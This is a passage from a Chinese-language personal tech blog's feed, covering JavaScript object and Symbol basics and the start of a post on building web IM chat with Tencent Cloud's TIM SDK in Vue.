class="line">perso2.age = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字面量的创建方式</span></span><br><span class="line"><span class="keyword">var</span> person3 = &#123;</span><br><span class="line">name:<span class="string">&quot;jakezhang&quot;</span>,<span class="comment">//name如果是保留字、有连接符/空格，则要&#x27;name-p&#x27;，即使用字符串</span></span><br><span class="line">age:<span class="number">23</span>,</span><br><span class="line">action:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上任意一种方式都可以创建一个对象实例，当然更多的写法和设计思想以后的文章再做体现。在实际的开发中我们用的最多的是字面量的方式，因为这种语法要求的代码量少，而且能够给人封装数据的感觉。这里引用一个红宝书的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayInfo</span>(<span class="params">args</span>) </span>&#123; </span><br><span class="line"> <span class="keyword">var</span> output = <span class="string">&quot;&quot;</span>; </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> args.name == <span class="string">&quot;string&quot;</span>)&#123;</span><br><span class="line"> output += <span class="string">&quot;Name: &quot;</span> + args.name + <span class="string">&quot;\n&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> args.age == <span class="string">&quot;number&quot;</span>) &#123; </span><br><span class="line"> output += <span class="string">&quot;Age: &quot;</span> + args.age + <span class="string">&quot;\n&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> alert(output); </span><br><span class="line">&#125; </span><br><span class="line">displayInfo(&#123; </span><br><span class="line"> name: <span class="string">&quot;Nicholas&quot;</span>, </span><br><span class="line"> age: <span class="number">29</span> </span><br><span class="line">&#125;); </span><br><span class="line">displayInfo(&#123; </span><br><span class="line"> name: <span class="string">&quot;Greg&quot;</span> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>代码相信都看得懂~</p><p><strong>Object 的每个实例都具有下列属性和方法：</strong></p><ul><li><code>constructor</code>：保存着用于创建当前对象的函数。对于前面的例子而言，构造函数（<code>constructor</code>）就是 <code>Object()</code>。</li><li><code>hasOwnProperty(propertyName)</code>：用于检查给定的属性在当前对象实例中（而不是在实例的原型中）是否存在。其中，作为参数的属性名（<code>propertyName</code>）必须以字符串形式指定（例如：<code>o.hasOwnProperty(&quot;name&quot;)</code>）。</li><li><code>isPrototypeOf(object)</code>：用于检查传入的对象是否是传入对象的原型。</li><li><code>propertyIsEnumerable(propertyName</code>)：用于检查给定的属性是否能够使用 for-in 语句来枚举。与<code>hasOwnProperty()</code>方法一样，作为参数的属性名必须以字符串形式指定。</li><li><code>toLocaleString()</code>：返回对象的字符串表示，该字符串与执行环境的地区对应。</li><li><code>toString()</code>：返回对象的字符串表示。</li><li><code>valueOf()</code>：返回对象的字符串、数值或布尔值表示。通常与 toString()方法的返回值相同。</li></ul><p>由于在 ECMAScript 中 Object 是所有对象的基础，因此所有对象都具有这些基本的属性和方法。</p><h3 id="9、基本数据类型和引用类型值的比较"><a href="#9、基本数据类型和引用类型值的比较" class="headerlink" title="9、基本数据类型和引用类型值的比较"></a>9、基本数据类型和引用类型值的比较</h3><h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a><strong>基本数据类型</strong></h4><ol><li><strong>值是不可变的</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;Jake Zhang&quot;</span>;</span><br><span class="line">name.toUpperCase();<span class="comment">//输出 JAKE ZHANG</span></span><br><span class="line"><span class="built_in">console</span>.log(name);<span class="comment">// 输出 Jake Zhang</span></span><br></pre></td></tr></table></figure><p>由以上代码可看出基本数据类型的值是不可变的。</p><ol><li><strong>存放在栈区</strong> 基本类型值指的是简单的数据段，按值访问，可操作保存在变量中的实际的值，其占据空间小、大小固定，属于被频繁使用的数据，所以放入栈（<code>stack</code>）中存储。</li><li><strong>值的比较</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> m = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(n == m);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(n === m);<span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>“==”：只进行值的比较，会进行数据类型转换；</p><p>“===”：不会转换数据类型。</p><h4 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h4><ol><li><strong>值是可变的</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name:<span class="string">&#x27;jake&#x27;</span>,</span><br><span class="line">        age:<span class="number">22</span>,</span><br><span class="line">        action:<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">&quot;do something!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">person.age = <span class="number">23</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person.age)<span class="comment">// 23</span></span><br></pre></td></tr></table></figure><p>有上面的代码可看出引用数据 类型可以拥有一个或多个属性和方法，而且是可以动态修改的。</p><ol><li><strong>同时存放在栈内存和堆内存</strong> 引用数据类型是存放在堆（heap）中的对象，占据空间大、大小不固定，如果存放在栈中，会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址，当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。（有关js中栈和堆的详解可参考文章[(<a href="https://link.juejin.cn/?target=https://www.cnblogs.com/heioray/p/9487093.html">www.cnblogs.com/heioray/p/9…</a>)）</li><li><strong>值的比较</strong> 当从一个变量向另一个变量赋引用类型的值时，同样也会将存储在变量中的对象的值复制一份到位新变量分配的空间中。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  age:<span class="number">20</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">var</span> person2 = person1;</span><br><span class="line">person2.age = <span class="number">23</span>;</span><br><span class="line"><span class="built_in">console</span>.log(person1.age = person2.age)<span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>前面讲到基本数据类型和引用数据类型存储于内存中的位置不一样，引用数据类型存储在堆中的对象，与此同时，在栈中存储了指针，而这个指针的指向正是堆中实体的起始位置。变量person1初始化时，person1指针指向该对象{age：20}的地址，将person1赋给person2后，person2又指向该对象{age：20}的地址，这两个变量指向了同一个对象。因此改变其中任何一个变量，都会相互影响。</p><p><img src="https://user-gold-cdn.xitu.io/2019/11/9/16e50425886c10a9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="ZJK"></p><p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">age</span>:<span class="number">22</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">//&#123;age:22&#125;</span></span><br></pre></td></tr></table></figure><p>上面代码中，a和b指向同一个对象，然后a的值变为1，这时不会对b产生影响，b还是指向原来的那个对象。</p><h3 id="10-Symbol的使用"><a href="#10-Symbol的使用" class="headerlink" title="10.Symbol的使用"></a>10.Symbol的使用</h3><ul><li>Symbol是一种基本类型，由Symbol函数生成</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有参数的情况</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>();</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>();</span><br><span class="line">s1 === s2 <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 有参数的情况</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">s1 === s2 <span class="comment">// false</span></span><br><span class="line">a.mySymbol = <span class="string">&#x27;hello&#x27;</span>  <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><ul><li>不能new，会报错，返回一个值，不是对象</li><li>Symbol 函数可以接受一个字符串作为参数</li><li>instanceof 的结果为 false</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">Symbol</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(s <span class="keyword">instanceof</span> <span class="built_in">Symbol</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><ul><li>Symbol 值可以作为标识符，用于对象的属性名，可以保证不会出现同名的属性。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line">a[mySymbol] = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  [mySymbol]: <span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种写法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, mySymbol, &#123; <span class="attr">value</span>: <span class="string">&#x27;Hello!&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上写法都得到同样结果</span></span><br><span class="line"><span class="built_in">console</span>.log(a[mySymbol]); <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p>该属性不会出现在 for…in、for…of 循环中，也不会被 Object.keys()、Object.getOwnPropertyNames()、JSON.stringify() 返回</p></li><li><p>使用同一个 Symbol 值，可以使用 Symbol.for</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s1 === s2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>使用<br>当需要区分形状，正方形，圆形，菱形 会使用 const shape = { triangle: ‘triangle’, circle: ‘circle’},不优雅，可以使用<br>const shape = { triangle: Symbol(), circle: Symbol()},</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Aiolimp的第一篇blog</title>
    <link href="http://aiolimp.com/2023/03/05/FirstBlog/"/>
    <id>http://aiolimp.com/2023/03/05/FirstBlog/</id>
    <published>2023-03-05T13:32:12.205Z</published>
    <updated>2023-03-05T13:32:12.205Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如果你没有实实在在的价值,那么你离抛弃的日子就不远了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IM聊天</title>
    <link href="http://aiolimp.com/2021/08/21/IM%E8%81%8A%E5%A4%A9/"/>
    <id>http://aiolimp.com/2021/08/21/IM%E8%81%8A%E5%A4%A9/</id>
    <published>2021-08-21T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.206Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="IM聊天"><a href="#IM聊天" class="headerlink" title="IM聊天"></a>IM聊天</h2><p>耗时三个月终于在公司完成了一个聊天系统的需求，过程很麻烦，但是经过自己的不断探索还是成功开发出来并且完美上线。这算是自己接触的一个比较完整的利用前端API进行的开发，所以在这里也做一个总结。</p><p>IM聊天主要利用的是腾讯云的<a href="https://cloud.tencent.com/document/product/269">即时通讯</a>进行消息功能实现。里面的<code>SDK</code>文档相当详细，也有不错的demo供开发者学习，能实现消息的发送、接收功能其实并不难和后端做好数据上的处理基本都可以实现，主要是公司的聊天系统需求比较复杂，一直在进行不断的迭代更新，包括后期实现的智能客服聊天系统、聊天远程控制功能等等。总体来说还是比较复杂，这里主要针对开发进行一个大致的总结，详细的可以在我的github看看<a href="https://github.com/Aiolimp/IM-VisitorMessage">源代码</a>以作参考。</p><p>项目主要针对web端实现IM聊天，可以看看<a href="https://cloud.tencent.com/document/product/269/37411">官方文档</a>提供的教程。</p><p><strong>聊天界面：</strong></p><p>客服端：</p><p><img src="https://img-blog.csdnimg.cn/55af7f5e2f03458caf85583696eeffe6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>访客端：</p><h3 id="初始化TIM"><a href="#初始化TIM" class="headerlink" title="初始化TIM"></a><strong>初始化TIM</strong></h3><p>接入前，您需要在 <a href="https://console.cloud.tencent.com/avc">云通信控制台</a> 中创建一个云通信应用，并取得 <code>SDKAppID</code>。</p><table><thead><tr><th align="left">API</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn//TIM.html#.create">create</a></td><td align="left">创建 SDK 实例。</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/utils/tim.js</span></span><br><span class="line"><span class="keyword">import</span> TIM <span class="keyword">from</span> <span class="string">&#x27;tim-js-sdk&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> COS <span class="keyword">from</span> <span class="string">&quot;cos-js-sdk-v5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tim</span> (<span class="params">SDKAppID</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> options = &#123;</span><br><span class="line">    SDKAppID: SDKAppID <span class="comment">// 接入时需要将0替换为您的即时通信 IM 应用的 SDKAppID</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 创建 SDK 实例，`TIM.create()`方法对于同一个 `SDKAppID` 只会返回同一份实例</span></span><br><span class="line">  <span class="keyword">let</span> tim = TIM.create(options); <span class="comment">// SDK 实例通常用 tim 表示</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置 SDK 日志输出级别，详细分级请参见 setLogLevel 接口的说明</span></span><br><span class="line">  tim.setLogLevel(<span class="number">1</span>); <span class="comment">// 普通级别，日志量较多，接入时建议使用</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 注册 COS SDK 插件</span></span><br><span class="line">  tim.registerPlugin(&#123;<span class="string">&#x27;cos-js-sdk&#x27;</span>: COS&#125;);</span><br><span class="line">  <span class="keyword">return</span> tim</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> tim</span><br></pre></td></tr></table></figure><p><strong>在main.js中全局挂载：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&quot;./App.vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;./store/index&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  router</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;./routes/routes&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> Antd <span class="keyword">from</span> <span class="string">&quot;ant-design-vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./api/index&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tim <span class="keyword">from</span> <span class="string">&#x27;./utils/tim&#x27;</span></span><br><span class="line"><span class="keyword">import</span> TIM <span class="keyword">from</span> <span class="string">&#x27;tim-js-sdk&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.prototype.tim = tim</span><br><span class="line">Vue.prototype.TIM = TIM</span><br><span class="line">Vue.prototype.$bus = <span class="keyword">new</span> Vue() <span class="comment">// event Bus 用于无关系组件间的通信。</span></span><br><span class="line">Vue.use(Antd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">&quot;#app&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="登录相关"><a href="#登录相关" class="headerlink" title="登录相关"></a>登录相关</h3><p>1.首先初始化签名</p><p>使用 用户ID(userID) 和 签名串(userSig) 登录即时通信 IM，登录流程有若干个异步执行的步骤，使用返回的 Promise 对象处理登录成功或失败。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">login</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> promise = tim.login(&#123;</span><br><span class="line">       userID: <span class="string">&quot;your userID&quot;</span>,</span><br><span class="line">       userSig: <span class="string">&quot;your userSig&quot;</span>,</span><br><span class="line">     &#125;);</span><br><span class="line">     promise</span><br><span class="line">       .then(<span class="function"><span class="keyword">function</span> (<span class="params">imResponse</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(imResponse.data); <span class="comment">// 登录成功</span></span><br><span class="line">         <span class="keyword">if</span> (imResponse.data.repeatLogin === <span class="literal">true</span>) &#123;</span><br><span class="line">           /</span><br><span class="line">           <span class="built_in">console</span>.log(imResponse.data.errorInfo);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">       .catch(<span class="function"><span class="keyword">function</span> (<span class="params">imError</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.warn(<span class="string">&quot;login error:&quot;</span>, imError); <span class="comment">// 登录失败的相关信息</span></span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>2.登录成功后会触发 SDK_READY 事件，该事件触发后，可正常使用 SDK 接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">initListener</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 登录成功后会触发 SDK_READY 事件，该事件触发后，可正常使用 SDK 接口</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.SDK_READY,</span><br><span class="line">      <span class="built_in">this</span>.onReadyStateUpdate,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// SDK NOT READT</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.SDK_NOT_READY,</span><br><span class="line">      <span class="built_in">this</span>.onReadyStateUpdate,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 被踢出</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.KICKED_OUT,</span><br><span class="line">      <span class="built_in">this</span>.onKickOut</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// SDK内部出错</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(<span class="built_in">this</span>.TIM.EVENT.ERROR, <span class="built_in">this</span>.onError);</span><br><span class="line">    <span class="comment">// 收到新消息</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.MESSAGE_RECEIVED,</span><br><span class="line">      <span class="built_in">this</span>.onReceiveMessage</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 会话列表更新</span></span><br><span class="line">    <span class="built_in">this</span>.tim(<span class="built_in">this</span>.infoObj.sdkAppID).on(</span><br><span class="line">      <span class="built_in">this</span>.TIM.EVENT.CONVERSATION_LIST_UPDATED,</span><br><span class="line">      <span class="built_in">this</span>.onUpdateConversationList,</span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>3.登出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">logout</span>(<span class="params">context</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 若有当前会话，在退出登录时已读上报</span></span><br><span class="line">  <span class="keyword">if</span> (context.rootState.conversation.currentConversation.conversationID) &#123;</span><br><span class="line">    tim(store.state.basic.imInfo.sdkAppID).setMessageRead(&#123; <span class="attr">conversationID</span>:               context.rootState.conversation.currentConversation.conversationID &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  tim(store.state.basic.imInfo.sdkAppID).logout().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    context.commit(<span class="string">&#x27;toggleIsLogin&#x27;</span>)</span><br><span class="line">    context.commit(<span class="string">&#x27;stopComputeCurrent&#x27;</span>)</span><br><span class="line">    context.commit(<span class="string">&#x27;reset&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h3><p>消息类型主要分为自定义消息和普通消息。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20210818161849499.png" alt="image-20210818161849499"></p><h4 id="自定义消息："><a href="#自定义消息：" class="headerlink" title="自定义消息："></a><strong>自定义消息：</strong></h4><p>创建自定义消息实例的接口，此接口返回一个消息实例，当 SDK 提供的能力不能满足您的需求时，可以使用自定义消息进行个性化定制。</p><p>自定义消息需要和后端沟通定义子消息类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访客端发送自定义消息</span></span><br><span class="line">   <span class="function"><span class="title">sendCustomMessage</span>(<span class="params">data</span>)</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> data1 = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">     <span class="keyword">if</span> (<span class="built_in">this</span>.sessionObj.serviceImAccount&amp;&amp;data1) &#123;</span><br><span class="line">       <span class="keyword">let</span> message = <span class="built_in">this</span>.tim(<span class="built_in">this</span>.imInfo.sdkAppID).createCustomMessage(&#123;</span><br><span class="line">         to: <span class="built_in">this</span>.sessionObj.serviceImAccount,</span><br><span class="line">         conversationType: <span class="built_in">this</span>.currentConversationType</span><br><span class="line">           ? <span class="built_in">this</span>.currentConversationType</span><br><span class="line">           : <span class="string">&quot;C2C&quot;</span>,</span><br><span class="line">         payload: &#123;</span><br><span class="line">           data: data1,</span><br><span class="line">           description: <span class="string">&quot;&quot;</span>,</span><br><span class="line">           extension: <span class="string">&quot;&quot;</span>,</span><br><span class="line">         &#125;,</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="built_in">this</span>.tim(<span class="built_in">this</span>.imInfo.sdkAppID)</span><br><span class="line">         .sendMessage(message)</span><br><span class="line">         .then(<span class="function">(<span class="params">res</span>) =&gt;</span> 